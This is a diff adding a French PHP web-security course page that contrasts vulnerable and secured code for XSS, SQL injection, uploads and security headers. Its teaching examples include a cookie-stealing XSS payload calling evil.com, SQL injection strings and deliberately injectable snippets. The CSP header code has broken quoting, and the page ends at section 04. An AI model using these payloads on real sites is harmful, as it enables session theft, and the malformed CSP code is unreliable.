@@ -1,0 +1,355 @@
+<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>PHP 21 &mdash; Securite web</title>
+<style>
+:root{--bg:#f5f2ee;--card:#fff;--surface:#faf8f5;--border:#e2ddd7;--accent:#7c3aed;--green:#16a34a;--yellow:#b45309;--red:#dc2626;--blue:#2563eb;--teal:#0f766e;--text:#1c1917;--muted:#57534e;--dim:#a8a29e;--title:#f0ece6;--mono:"SF Mono","Fira Code","Consolas",monospace;--sh:0 1px 3px rgba(0,0,0,.08);--shm:0 4px 12px rgba(0,0,0,.08);}
+*{box-sizing:border-box;margin:0;padding:0;}html{scroll-behavior:smooth;}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:var(--bg);color:var(--text);padding:0 0 80px;}
+body::before{content:"";position:fixed;inset:0;background-image:linear-gradient(rgba(0,0,0,.022) 1px,transparent 1px),linear-gradient(90deg,rgba(0,0,0,.022) 1px,transparent 1px);background-size:36px 36px;pointer-events:none;z-index:0;}
+.layout{display:flex;min-height:100vh;position:relative;z-index:1;}
+.sidebar{position:fixed;left:0;top:0;width:238px;height:100vh;background:var(--card);border-right:1px solid var(--border);padding:24px 0;overflow-y:auto;z-index:50;box-shadow:var(--sh);}
+.sidebar-logo{padding:0 20px 20px;border-bottom:1px solid var(--border);margin-bottom:16px;}.sidebar-logo span{font-size:.83rem;font-weight:800;color:var(--accent);}.sidebar-logo p{font-size:.67rem;color:var(--dim);margin-top:3px;}
+.nav-section{padding:0 12px;margin-bottom:8px;}.nav-label{font-size:.6rem;letter-spacing:.12em;text-transform:uppercase;color:var(--dim);padding:8px 8px 4px;font-weight:700;}
+.nav-link{display:flex;align-items:center;gap:8px;padding:7px 10px;border-radius:6px;font-size:.78rem;color:var(--muted);text-decoration:none;transition:all .15s;margin-bottom:2px;}
+.nav-link:hover{background:rgba(124,58,237,.07);}.nav-link.active{background:rgba(124,58,237,.1);color:var(--accent);font-weight:600;}
+.nav-num{font-family:var(--mono);font-size:.63rem;color:var(--dim);flex-shrink:0;width:18px;}
+.content{margin-left:238px;padding:48px 52px 80px;max-width:calc(100% - 238px);}
+.page-header{margin-bottom:52px;}
+.serie-badge{display:inline-flex;font-family:var(--mono);font-size:.68rem;padding:3px 10px;border-radius:20px;background:rgba(124,58,237,.08);border:1px solid rgba(124,58,237,.2);color:var(--accent);margin-bottom:12px;}
+.page-header h1{font-size:2.3rem;font-weight:800;letter-spacing:-.03em;line-height:1.1;margin-bottom:12px;}
+.hl{background:linear-gradient(135deg,var(--accent),#a855f7);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
+.page-header p{color:var(--muted);font-size:.95rem;line-height:1.7;max-width:560px;margin-bottom:16px;}
+.objectifs{display:flex;gap:8px;flex-wrap:wrap;}.obj{font-family:var(--mono);font-size:.67rem;padding:3px 10px;border-radius:20px;border:1px solid;}
+.obj.p{background:rgba(124,58,237,.07);border-color:rgba(124,58,237,.25);color:var(--accent);}
+.obj.r{background:rgba(220,38,38,.07);border-color:rgba(220,38,38,.25);color:var(--red);}
+.obj.g{background:rgba(22,163,74,.07);border-color:rgba(22,163,74,.25);color:var(--green);}
+.obj.b{background:rgba(37,99,235,.07);border-color:rgba(37,99,235,.25);color:var(--blue);}
+.obj.y{background:rgba(180,83,9,.07);border-color:rgba(180,83,9,.25);color:var(--yellow);}
+.etape{margin-bottom:60px;scroll-margin-top:24px;}.etape-header{display:flex;align-items:center;gap:14px;margin-bottom:20px;}
+.etape-num{font-family:var(--mono);font-size:2rem;font-weight:900;color:rgba(124,58,237,.13);line-height:1;flex-shrink:0;width:48px;}
+.etape-tag{font-family:var(--mono);font-size:.62rem;letter-spacing:.12em;text-transform:uppercase;color:var(--dim);margin-bottom:4px;}.etape h2{font-size:1.3rem;font-weight:800;letter-spacing:-.02em;}
+.prose{color:var(--muted);font-size:.9rem;line-height:1.78;margin-bottom:14px;}.prose strong{color:var(--text);}.prose code{font-family:var(--mono);font-size:.8rem;background:rgba(124,58,237,.07);border:1px solid rgba(124,58,237,.15);padding:1px 6px;border-radius:3px;color:var(--accent);}
+.attack-badge{display:inline-flex;font-family:var(--mono);font-size:.65rem;font-weight:700;padding:2px 8px;border-radius:4px;margin-bottom:10px;}
+.attack-badge.xss{background:rgba(220,38,38,.1);color:var(--red);border:1px solid rgba(220,38,38,.3);}
+.attack-badge.sqli{background:rgba(180,83,9,.1);color:var(--yellow);border:1px solid rgba(180,83,9,.3);}
+.attack-badge.upload{background:rgba(37,99,235,.1);color:var(--blue);border:1px solid rgba(37,99,235,.3);}
+.attack-badge.headers{background:rgba(15,118,110,.1);color:var(--teal);border:1px solid rgba(15,118,110,.3);}
+.attack-badge.valid{background:rgba(22,163,74,.1);color:var(--green);border:1px solid rgba(22,163,74,.3);}
+.callout{border-radius:10px;padding:13px 17px;margin-bottom:14px;font-size:.87rem;line-height:1.65;display:flex;gap:10px;}.ci{font-family:var(--mono);font-size:.73rem;font-weight:700;padding:1px 6px;border-radius:3px;flex-shrink:0;margin-top:1px;}
+.callout.info{background:rgba(37,99,235,.05);border:1px solid rgba(37,99,235,.2);color:#1e40af;}.callout.info .ci{background:rgba(37,99,235,.12);color:var(--blue);}
+.callout.tip{background:rgba(180,83,9,.05);border:1px solid rgba(180,83,9,.2);color:#92400e;}.callout.tip .ci{background:rgba(180,83,9,.1);color:var(--yellow);}
+.callout.warn{background:rgba(220,38,38,.05);border:1px solid rgba(220,38,38,.2);color:#991b1b;}.callout.warn .ci{background:rgba(220,38,38,.1);color:var(--red);}
+.callout.success{background:rgba(22,163,74,.05);border:1px solid rgba(22,163,74,.2);color:#14532d;}.callout.success .ci{background:rgba(22,163,74,.1);color:var(--green);}
+.callout strong{color:inherit;}.callout code{font-family:var(--mono);font-size:.78rem;background:rgba(0,0,0,.06);padding:1px 5px;border-radius:3px;}
+.compare-2{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:14px;}
+.compare-box{background:var(--card);border:1px solid var(--border);border-radius:10px;overflow:hidden;}
+.compare-box h4{font-family:var(--mono);font-size:.72rem;font-weight:700;padding:8px 14px;border-bottom:1px solid var(--border);}
+.compare-box.bad h4{background:rgba(220,38,38,.05);color:var(--red);}
+.compare-box.good h4{background:rgba(22,163,74,.05);color:var(--green);}
+.compare-box .code-block{margin:0;border-radius:0;border:none;box-shadow:none;}
+.code-block{background:#1e1e2e;border:1px solid #2a2a3e;border-radius:10px;overflow:hidden;margin-bottom:14px;box-shadow:var(--shm);}
+.cb-head{background:#16162a;padding:9px 16px;display:flex;align-items:center;gap:8px;border-bottom:1px solid #2a2a3e;}.dots{display:flex;gap:5px;}.dot{width:10px;height:10px;border-radius:50%;}
+.dot.r{background:#ff5f57;}.dot.o{background:#febc2e;}.dot.g{background:#28c840;}.cb-name{font-family:var(--mono);font-size:.73rem;color:#8892b0;flex:1;}
+.cb-badge{font-size:.6rem;font-family:var(--mono);padding:2px 7px;border-radius:3px;margin-left:4px;background:rgba(124,58,237,.15);border:1px solid rgba(124,58,237,.3);color:#c4b5fd;}
+.cb-badge.bad{background:rgba(220,38,38,.12);border:1px solid rgba(220,38,38,.3);color:#fca5a5;}
+.cb-badge.good{background:rgba(22,163,74,.12);border:1px solid rgba(22,163,74,.3);color:#4ade80;}
+.cb-copy{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);color:#8892b0;font-family:var(--mono);font-size:.65rem;padding:3px 9px;border-radius:4px;cursor:pointer;transition:all .15s;}
+.cb-copy:hover{background:rgba(124,58,237,.2);color:#c4b5fd;}.cb-copy.ok{color:#4ade80;}
+pre{padding:18px 20px;overflow-x:auto;font-family:var(--mono);font-size:.82rem;line-height:1.95;color:#cdd6f4;}
+.kw{color:#cba6f7;font-weight:600;}.fn{color:#89dceb;}.str{color:#a6e3a1;}.num{color:#fab387;}.cmt{color:#6c7086;font-style:italic;}.vr{color:#89b4fa;}.cls{color:#f38ba8;font-weight:600;}.vis{color:#cba6f7;font-weight:600;}.ptag{color:#f38ba8;font-weight:700;}.danger{color:#fca5a5;font-weight:700;}.safe{color:#4ade80;font-weight:700;}
+.table-wrap{overflow-x:auto;margin-bottom:14px;}table{width:100%;border-collapse:collapse;font-size:.84rem;background:var(--card);border-radius:10px;overflow:hidden;box-shadow:var(--sh);}
+th{background:var(--title);padding:10px 14px;text-align:left;font-family:var(--mono);font-size:.67rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:var(--muted);border-bottom:1px solid var(--border);}
+td{padding:10px 14px;border-bottom:1px solid var(--border);color:var(--muted);vertical-align:top;line-height:1.55;}
+td:first-child{font-family:var(--mono);font-size:.8rem;color:var(--accent);font-weight:600;}
+tr:last-child td{border-bottom:none;}
+.checkpoint{display:flex;align-items:center;gap:12px;background:rgba(22,163,74,.05);border:1px solid rgba(22,163,74,.2);border-radius:8px;padding:12px 16px;margin-top:16px;}.cp-icon{font-family:var(--mono);font-size:.78rem;font-weight:700;color:var(--green);flex-shrink:0;border:1px solid rgba(22,163,74,.3);padding:2px 7px;border-radius:3px;}.cp-text{font-size:.84rem;color:#15803d;line-height:1.6;}.cp-text strong{color:var(--green);}
+.quiz-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:20px;margin-bottom:12px;}.q{font-weight:600;font-size:.91rem;margin-bottom:13px;}.qn{color:var(--accent);font-family:var(--mono);font-size:.77rem;margin-right:8px;}
+.opts{display:flex;flex-direction:column;gap:7px;}.opt{padding:9px 15px;border-radius:6px;border:1px solid var(--border);background:var(--surface);color:var(--muted);font-size:.83rem;cursor:pointer;transition:all .15s;text-align:left;font-family:var(--mono);}
+.opt:hover{border-color:rgba(124,58,237,.3);}.opt.correct{border-color:rgba(22,163,74,.5);background:rgba(22,163,74,.07);color:var(--green);}.opt.wrong{border-color:rgba(220,38,38,.4);background:rgba(220,38,38,.05);color:var(--red);}
+.fb{margin-top:10px;font-size:.81rem;padding:10px 14px;border-radius:7px;display:none;line-height:1.6;}.fb.show{display:block;}.fb.ok{background:rgba(22,163,74,.07);border:1px solid rgba(22,163,74,.2);color:#15803d;}.fb.ko{background:rgba(220,38,38,.06);border:1px solid rgba(220,38,38,.2);color:#991b1b;}
+.divider{height:1px;background:var(--border);margin:48px 0;}
+@media(max-width:900px){.sidebar{display:none;}.content{margin-left:0;padding:24px;max-width:100%;}.compare-2{grid-template-columns:1fr;}}
+</style></head><body><div class="layout">
+<aside class="sidebar"><div class="sidebar-logo"><span>[ ] PHP 21 &mdash; Securite</span><p>Attaques et contre-mesures</p></div><div class="nav-section"><div class="nav-label">Ce support</div><a href="#plan" class="nav-link"><span class="nav-num">00</span>Les grandes menaces</a><a href="#e1" class="nav-link"><span class="nav-num">01</span>XSS &mdash; injection HTML/JS</a><a href="#e2" class="nav-link"><span class="nav-num">02</span>Injection SQL</a><a href="#e3" class="nav-link"><span class="nav-num">03</span>Upload de fichiers</a><a href="#e4" class="nav-link"><span class="nav-num">04</span>En-tetes HTTP securite</a><a href="#e5" class="nav-link"><span class="nav-num">05</span>Validation serveur</a><a href="#e6" class="nav-link"><span class="nav-num">06</span>Directory traversal</a><a href="#e7" class="nav-link"><span class="nav-num">07</span>Exposition de donnees</a><a href="#e8" class="nav-link"><span class="nav-num">08</span>Checklist complete</a><a href="#quiz" class="nav-link"><span class="nav-num">09</span>Quiz</a></div></aside><main class="content">
+<div class="page-header"><div class="serie-badge">Support 21</div><h1>Securite<br><span class="hl">web PHP</span></h1><p>XSS, injections SQL, upload malveillant, directory traversal, en-tetes HTTP de securite : toutes les attaques courantes et leurs contre-mesures concretes en PHP.</p><div class="objectifs"><span class="obj r">XSS</span><span class="obj y">SQLi</span><span class="obj b">Upload</span><span class="obj g">Headers</span><span class="obj p">Validation</span></div></div>
+<section class="etape" id="plan"><div class="etape-header"><div class="etape-num">00</div><div><div class="etape-tag">Vue d'ensemble</div><h2>Les grandes menaces web</h2></div></div><p class="prose">Les applications web font face a des attaques classiques et bien documentees. La bonne nouvelle : elles se protegent toutes avec des techniques simples, appliquees systematiquement.</p><div class="table-wrap"><table><thead><tr><th>Attaque</th><th>Principe</th><th>Contre-mesure principale</th></tr></thead><tbody><tr><td>XSS</td><td>Injecter du JS dans la page pour voler des donnees ou des sessions</td><td>htmlspecialchars() sur toute sortie</td></tr><tr><td>Injection SQL</td><td>Injecter du SQL dans une requete pour lire/modifier la BDD</td><td>Requetes preparees PDO</td></tr><tr><td>Upload malveillant</td><td>Uploader un fichier PHP executable sur le serveur</td><td>Verifier le MIME reel + renommer + dossier hors web</td></tr><tr><td>Directory traversal</td><td>Acceder a des fichiers hors du dossier prevu via ../</td><td>realpath() + verification du prefixe</td></tr><tr><td>CSRF</td><td>Forger une requete depuis un autre site</td><td>Token CSRF sur tous les formulaires POST</td></tr><tr><td>Exposition de donnees</td><td>Afficher des erreurs SQL, chemins de fichiers, etc.</td><td>Masquer les erreurs en production</td></tr><tr><td>En-tetes manquants</td><td>Absence de CSP, X-Frame-Options, etc.</td><td>Ajouter les en-tetes de securite HTTP</td></tr><tr><td>Brute force</td><td>Tester des milliers de mots de passe</td><td>Rate limiting + bcrypt + lockout</td></tr></tbody></table></div><div class="callout info"><span class="ci">i</span><div><strong>OWASP Top 10.</strong> L'OWASP (Open Web Application Security Project) publie la liste des 10 risques les plus critiques pour les applications web. Les injections (SQL, HTML/JS) et les mauvaises configurations de securite sont systematiquement en tete. Ce support couvre les plus courants.</div></div></section><div class="divider"></div>
+<section class="etape" id="e1"><div class="etape-header"><div class="etape-num">01</div><div><div class="etape-tag">Attaque 1</div><h2>XSS &mdash; Cross-Site Scripting</h2></div></div><div class="attack-badge xss">XSS &mdash; Cross-Site Scripting</div><p class="prose">Une XSS se produit quand des donnees utilisateur sont affichees dans la page HTML sans etre echappees. L'attaquant injecte du JavaScript qui s'execute dans le navigateur de la victime.</p><div class="compare-2"><div class="compare-box bad"><h4>✗ Sans echappement &mdash; XSS possible</h4><div class="code-block"><div class="cb-head"><div class="dots"><div class="dot r"></div><div class="dot o"></div><div class="dot g"></div></div><span class="cb-name"></span><span class="cb-badge bad">Vulnérable</span><button class="cb-copy" onclick="cp(this)">copier</button></div><pre><code><span class="ptag">&lt;?php</span>
+<span class="cmt">// Nom de produit en BDD : &lt;script&gt;document.location='http://evil.com/steal?c='+document.cookie&lt;/script&gt;</span>
+<span class="danger">echo</span> <span class="vr">$_GET</span>[<span class="str">'nom'</span>];
+<span class="cmt">// Le script s'execute dans le navigateur !</span>
+<span class="danger">echo</span> <span class="vr">$produit</span>[<span class="str">'nom'</span>];
+<span class="cmt">// Meme danger depuis la BDD</span></code></pre></div></div><div class="compare-box good"><h4>✓ Avec htmlspecialchars()</h4><div class="code-block"><div class="cb-head"><div class="dots"><div class="dot r"></div><div class="dot o"></div><div class="dot g"></div></div><span class="cb-name"></span><span class="cb-badge good">Securise</span><button class="cb-copy" onclick="cp(this)">copier</button></div><pre><code><span class="ptag">&lt;?php</span>
+<span class="cmt">// htmlspecialchars() transforme les caracteres speciaux</span>
+<span class="cmt">// &lt; &gt; " &amp; en entites HTML inoffensives</span>
+<span class="safe">echo</span> <span class="fn">htmlspecialchars</span>(<span class="vr">$_GET</span>[<span class="str">'nom'</span>], <span class="fn">ENT_QUOTES</span>, <span class="str">'UTF-8'</span>);
+
+<span class="cmt">// Raccourci : creer une fonction helper</span>
+<span class="kw">function</span> <span class="fn">e</span>(string <span class="vr">$v</span>): string {
+    <span class="kw">return</span> <span class="fn">htmlspecialchars</span>(<span class="vr">$v</span>, <span class="fn">ENT_QUOTES</span> | <span class="fn">ENT_SUBSTITUTE</span>, <span class="str">'UTF-8'</span>);
+}
+<span class="safe">echo</span> <span class="fn">e</span>(<span class="vr">$produit</span>[<span class="str">'nom'</span>]);</code></pre></div></div></div><div class="code-block"><div class="cb-head"><div class="dots"><div class="dot r"></div><div class="dot o"></div><div class="dot g"></div></div><span class="cb-name">XSS dans les attributs HTML et URLs &mdash; cas speciaux</span><span class="cb-badge ">PHP</span><button class="cb-copy" onclick="cp(this)">copier</button></div><pre><code><span class="ptag">&lt;?php</span>
+<span class="cmt">// XSS dans un attribut HTML &mdash; toujours ENT_QUOTES pour echapper les guillemets</span>
+<span class="danger">// DANGEREUX :</span>
+<span class="cmt">// &lt;input value="&lt;?= $_POST['val'] ?&gt;"&gt;  &larr; XSS via " onmouseover="alert(1)</span>
+
+<span class="safe">// SECURISE :</span>
+<span class="kw">echo</span> <span class="str">'&lt;input value="'</span> . <span class="fn">htmlspecialchars</span>(<span class="vr">$_POST</span>[<span class="str">'val'</span>], <span class="fn">ENT_QUOTES</span>, <span class="str">'UTF-8'</span>) . <span class="str">'"&gt;'</span>;
+
+<span class="cmt">// XSS via un attribut href &mdash; javascript: URI</span>
+<span class="danger">// DANGEREUX :</span>
+<span class="cmt">// &lt;a href="&lt;?= $_GET['url'] ?&gt;"&gt;  &larr; javascript:alert(1) passe en clair</span>
+
+<span class="safe">// SECURISE : valider le scheme</span>
+<span class="vr">$url</span> = <span class="vr">$_GET</span>[<span class="str">'url'</span>] ?? <span class="str">''</span>;
+<span class="kw">if</span> (!<span class="fn">preg_match</span>(<span class="str">'#^https?://#'</span>, <span class="vr">$url</span>)) { <span class="vr">$url</span> = <span class="str">'#'</span>; }
+<span class="kw">echo</span> <span class="str">'&lt;a href="'</span> . <span class="fn">htmlspecialchars</span>(<span class="vr">$url</span>, <span class="fn">ENT_QUOTES</span>) . <span class="str">'"&gt;'</span>;
+
+<span class="cmt">// Regle : echapper TOUTE variable affichee dans le HTML</span>
+<span class="cmt">// Peu importe la source : $_GET, $_POST, BDD, API externe</span></code></pre></div><div class="callout warn"><span class="ci">!</span><div><strong>Les donnees en BDD peuvent aussi etre malveillantes.</strong> Si quelqu'un a insere <code>&lt;script&gt;...&lt;/script&gt;</code> en BDD (via un ancien formulaire non protege), afficher ce champ sans <code>htmlspecialchars()</code> execute le script. Il faut echapper a l'affichage, pas seulement a la saisie.</div></div></section><div class="divider"></div>
+<section class="etape" id="e2"><div class="etape-header"><div class="etape-num">02</div><div><div class="etape-tag">Attaque 2</div><h2>Injection SQL</h2></div></div><div class="attack-badge sqli">SQLi &mdash; Injection SQL</div><p class="prose">Une injection SQL injecte du code SQL dans une requete construite par concatenation. L'attaquant peut lire toute la BDD, modifier des donnees, ou contourner l'authentification.</p><div class="compare-2"><div class="compare-box bad"><h4>✗ Concatenation &mdash; injectable</h4><div class="code-block"><div class="cb-head"><div class="dots"><div class="dot r"></div><div class="dot o"></div><div class="dot g"></div></div><span class="cb-name"></span><span class="cb-badge bad">Vulnérable</span><button class="cb-copy" onclick="cp(this)">copier</button></div><pre><code><span class="ptag">&lt;?php</span>
+<span class="cmt">// URL : /produits?id=1 OR 1=1</span>
+<span class="cmt">// SQL genere : SELECT * FROM produits WHERE id = 1 OR 1=1</span>
+<span class="cmt">// => retourne TOUTE la table</span>
+
+<span class="cmt">// URL : /login?email=' OR 1=1--</span>
+<span class="cmt">// => contourne l'auth completement</span>
+
+<span class="danger">$sql</span> = <span class="str">'SELECT * FROM produits WHERE id = '</span>
+      . <span class="vr">$_GET</span>[<span class="str">'id'</span>];  <span class="danger">// INJECTABLE</span></code></pre></div></div><div class="compare-box good"><h4>✓ Requetes preparees PDO</h4><div class="code-block"><div class="cb-head"><div class="dots"><div class="dot r"></div><div class="dot o"></div><div class="dot g"></div></div><span class="cb-name"></span><span class="cb-badge good">Securise</span><button class="cb-copy" onclick="cp(this)">copier</button></div><pre><code><span class="ptag">&lt;?php</span>
+<span class="cmt">// Les parametres sont SEPARES du SQL</span>
+<span class="cmt">// Le moteur SQL les traite comme des donnees, jamais comme du code</span>
+
+<span class="safe">$stmt</span> = <span class="vr">$pdo</span>-><span class="fn">prepare</span>(<span class="str">'SELECT * FROM produits WHERE id = ?'</span>);
+<span class="safe">$stmt</span>-><span class="fn">execute</span>([(int)<span class="vr">$_GET</span>[<span class="str">'id'</span>]]);  <span class="safe">// SECURISE</span>
+<span class="vr">$produit</span> = <span class="safe">$stmt</span>-><span class="fn">fetch</span>();</code></pre></div></div></div><div class="code-block"><div class="cb-head"><div class="dots"><div class="dot r"></div><div class="dot o"></div><div class="dot g"></div></div><span class="cb-name">Cas particuliers &mdash; ORDER BY et noms de colonnes</span><span class="cb-badge ">PHP</span><button class="cb-copy" onclick="cp(this)">copier</button></div><pre><code><span class="ptag">&lt;?php</span>
+<span class="cmt">// Les noms de colonnes et les mots-cles SQL ne peuvent pas</span>
+<span class="cmt">// etre des parametres PDO. Il faut valider par whitelist.</span>
+
+<span class="cmt">// DANGEREUX :</span>
+<span class="danger">$sql</span> = <span class="str">'SELECT * FROM produits ORDER BY '</span> . <span class="vr">$_GET</span>[<span class="str">'tri'</span>]; <span class="danger">// injectable</span>
+
+<span class="cmt">// SECURISE : whitelist des colonnes autorisees</span>
+<span class="vr">$colonnesAutorisees</span> = [<span class="str">'nom'</span>, <span class="str">'prix'</span>, <span class="str">'stock'</span>, <span class="str">'cree_le'</span>];
+<span class="vr">$tri</span> = <span class="fn">in_array</span>(<span class="vr">$_GET</span>[<span class="str">'tri'</span>] ?? <span class="str">'nom'</span>, <span class="vr">$colonnesAutorisees</span>)
+    ? <span class="vr">$_GET</span>[<span class="str">'tri'</span>]
+    : <span class="str">'nom'</span>;  <span class="cmt">// valeur par defaut si invalide</span>
+
+<span class="vr">$ordre</span> = <span class="vr">$_GET</span>[<span class="str">'ordre'</span>] === <span class="str">'desc'</span> ? <span class="str">'DESC'</span> : <span class="str">'ASC'</span>;
+
+<span class="safe">$sql</span> = <span class="str">'SELECT * FROM produits ORDER BY '</span> . <span class="vr">$tri</span> . <span class="str">' '</span> . <span class="vr">$ordre</span>;
+<span class="cmt">// $tri et $ordre viennent de listes controlees : pas d'injection possible</span></code></pre></div><div class="callout success"><span class="ci">+</span><div><strong>Les requetes preparees rendent les injections SQL impossibles.</strong> Le moteur SQL recoit le SQL et les donnees separement. Meme si <code>$_GET['id'] = "1 OR 1=1"</code>, la BDD cherchera un produit dont l'id est litteralement la chaine "1 OR 1=1" &mdash; qui n'existera pas.</div></div></section><div class="divider"></div>
+<section class="etape" id="e3"><div class="etape-header"><div class="etape-num">03</div><div><div class="etape-tag">Attaque 3</div><h2>Upload de fichiers malveillants</h2></div></div><div class="attack-badge upload">Upload malveillant</div><p class="prose">Si un attaquant uploade un fichier PHP sur le serveur et peut y acceder via le navigateur, il obtient une execution de code arbitraire sur le serveur. C'est l'une des vulnerabilites les plus critiques.</p><div class="code-block"><div class="cb-head"><div class="dots"><div class="dot r"></div><div class="dot o"></div><div class="dot g"></div></div><span class="cb-name">Upload securise &mdash; validation complete</span><span class="cb-badge good">PHP</span><button class="cb-copy" onclick="cp(this)">copier</button></div><pre><code><span class="ptag">&lt;?php</span>
+<span class="kw">function</span> <span class="fn">uploaderImage</span>(array <span class="vr">$file</span>, string <span class="vr">$dossierDest</span>): string {
+
+    <span class="cmt">// 1. Verifier les erreurs d'upload</span>
+    <span class="kw">if</span> (<span class="vr">$file</span>[<span class="str">'error'</span>] !== <span class="fn">UPLOAD_ERR_OK</span>) {
+        <span class="kw">throw new</span> <span class="cls">RuntimeException</span>(<span class="str">'Erreur upload : '</span> . <span class="vr">$file</span>[<span class="str">'error'</span>]);
+    }
+
+    <span class="cmt">// 2. Verifier la taille</span>
+    <span class="vr">$maxSize</span> = <span class="num">2</span> * <span class="num">1024</span> * <span class="num">1024</span>;  <span class="cmt">// 2 Mo</span>
+    <span class="kw">if</span> (<span class="vr">$file</span>[<span class="str">'size'</span>] > <span class="vr">$maxSize</span>) {
+        <span class="kw">throw new</span> <span class="cls">RuntimeException</span>(<span class="str">'Fichier trop volumineux (max 2 Mo)'</span>);
+    }
+
+    <span class="cmt">// 3. Verifier le MIME REEL (pas le type declare par le client)</span>
+    <span class="cmt">// finfo lit les premiers octets du fichier (magic bytes)</span>
+    <span class="vr">$finfo</span>    = <span class="kw">new</span> <span class="cls">finfo</span>(<span class="fn">FILEINFO_MIME_TYPE</span>);
+    <span class="vr">$mimeReel</span> = <span class="vr">$finfo</span>-><span class="fn">file</span>(<span class="vr">$file</span>[<span class="str">'tmp_name'</span>]);
+
+    <span class="vr">$mimesAutorises</span> = [<span class="str">'image/jpeg'</span>, <span class="str">'image/png'</span>, <span class="str">'image/gif'</span>, <span class="str">'image/webp'</span>];
+    <span class="kw">if</span> (!<span class="fn">in_array</span>(<span class="vr">$mimeReel</span>, <span class="vr">$mimesAutorises</span>, <span class="kw">true</span>)) {
+        <span class="kw">throw new</span> <span class="cls">RuntimeException</span>(<span class="str">'Type de fichier non autorise : '</span> . <span class="vr">$mimeReel</span>);
+    }
+
+    <span class="cmt">// 4. Generer un nom aleatoire (pas le nom original)</span>
+    <span class="vr">$extension</span> = <span class="fn">match</span>(<span class="vr">$mimeReel</span>) {
+        <span class="str">'image/jpeg'</span> => <span class="str">'jpg'</span>,
+        <span class="str">'image/png'</span>  => <span class="str">'png'</span>,
+        <span class="str">'image/gif'</span>  => <span class="str">'gif'</span>,
+        <span class="str">'image/webp'</span> => <span class="str">'webp'</span>,
+    };
+    <span class="vr">$nomFichier</span> = <span class="fn">bin2hex</span>(<span class="fn">random_bytes</span>(<span class="num">16</span>)) . <span class="str">'.'</span> . <span class="vr">$extension</span>;
+
+    <span class="cmt">// 5. Deplacer dans le dossier de destination</span>
+    <span class="cmt">// Ce dossier doit etre HORS de la racine web OU avoir un .htaccess</span>
+    <span class="vr">$destination</span> = <span class="fn">rtrim</span>(<span class="vr">$dossierDest</span>, <span class="str">'/'</span>) . <span class="str">'/'</span> . <span class="vr">$nomFichier</span>;
+    <span class="kw">if</span> (!<span class="fn">move_uploaded_file</span>(<span class="vr">$file</span>[<span class="str">'tmp_name'</span>], <span class="vr">$destination</span>)) {
+        <span class="kw">throw new</span> <span class="cls">RuntimeException</span>(<span class="str">'Impossible de deplacer le fichier'</span>);
+    }
+
+    <span class="kw">return</span> <span class="vr">$nomFichier</span>;
+}</code></pre></div><div class="code-block"><div class="cb-head"><div class="dots"><div class="dot r"></div><div class="dot o"></div><div class="dot g"></div></div><span class="cb-name">uploads/.htaccess &mdash; bloquer l'execution PHP</span><span class="cb-badge ">Config</span><button class="cb-copy" onclick="cp(this)">copier</button></div><pre><code><span class="cmt"># .htaccess dans le dossier uploads/</span>
+<span class="cmt"># Empeche l'execution de tout script</span>
+php_flag engine off
+<span class="cmt">RemoveHandler .php .php3 .php5 .phtml</span>
+<span class="cmt">Options -ExecCGI</span>
+
+<span class="cmt"># Ou : placer uploads/ hors de public/</span>
+<span class="cmt">## Structure recommandee :</span>
+mon-projet/
+  public/          &lt;-- accessible web
+    index.php
+  storage/         &lt;-- inaccessible directement
+    uploads/       &lt;-- fichiers stockes ici
+      images/</code></pre></div><div class="callout warn"><span class="ci">!</span><div><strong>Ne jamais faire confiance au type MIME declare par le client.</strong> <code>$_FILES['fichier']['type']</code> peut etre falsifie. Utiliser <code>finfo_file()</code> ou <code>new finfo(FILEINFO_MIME_TYPE)</code> qui lit les magic bytes du fichier lui-meme &mdash; cette valeur ne peut pas etre falsifiee.</div></div></section><div class="divider"></div>
+<section class="etape" id="e4"><div class="etape-header"><div class="etape-num">04</div><div><div class="etape-tag">Defense</div><h2>En-tetes HTTP de securite</h2></div></div><p class="prose">Les en-tetes HTTP de securite instruisent le navigateur sur la maniere de gerer le contenu. Ils proteges contre des classes entieres d'attaques sans effort cote application.</p><div class="code-block"><div class="cb-head"><div class="dots"><div class="dot r"></div><div class="dot o"></div><div class="dot g"></div></div><span class="cb-name">En-tetes de securite &mdash; front controller</span><span class="cb-badge good">PHP</span><button class="cb-copy" onclick="cp(this)">copier</button></div><pre><code><span class="ptag">&lt;?php</span>
+<span class="cmt">// A envoyer sur toutes les pages &mdash; de preference dans le front controller</span>
+
+<span class="cmt">// Empeche le clickjacking (inclusion dans une iframe)</span>
+<span class="fn">header</span>(<span class="str">'X-Frame-Options: DENY'</span>);
+
+<span class="cmt">// Empeche le MIME sniffing (ex: JS deguise en image)</span>
+<span class="fn">header</span>(<span class="str">'X-Content-Type-Options: nosniff'</span>);
+
+<span class="cmt">// Active le filtre XSS des anciens navigateurs</span>
+<span class="fn">header</span>(<span class="str">'X-XSS-Protection: 1; mode=block'</span>);
+
+<span class="cmt">// Force HTTPS (production uniquement)</span>
+<span class="fn">header</span>(<span class="str">'Strict-Transport-Security: max-age=31536000; includeSubDomains'</span>);
+
+<span class="cmt">// Politique de referrer</span>
+<span class="fn">header</span>(<span class="str">'Referrer-Policy: strict-origin-when-cross-origin'</span>);
+
+<span class="cmt">// Content Security Policy &mdash; whitelist des sources autorisees</span>
+<span class="cmt">// La plus puissante contre les XSS : bloque les scripts inline et externes non listes</span>
+<span class="fn">header</span>(<span class="str">'Content-Security-Policy: '</span>
+    . <span class="str">'default-src 'self'; '</span>
+    . <span class="str">'script-src 'self' 'nonce-'</span> . <span class="vr">$nonce</span> . <span class="str">''; '</span>
+    . <span class="str">'style-src 'self' 'unsafe-inline'; '</span>
+    . <span class="str">'img-src 'self' data: https:; '</span>
+    . <span class="str">'frame-ancestors 'none''</span>
+);
+
+<span class="cmt">// Ne pas exposer la version de PHP</span>
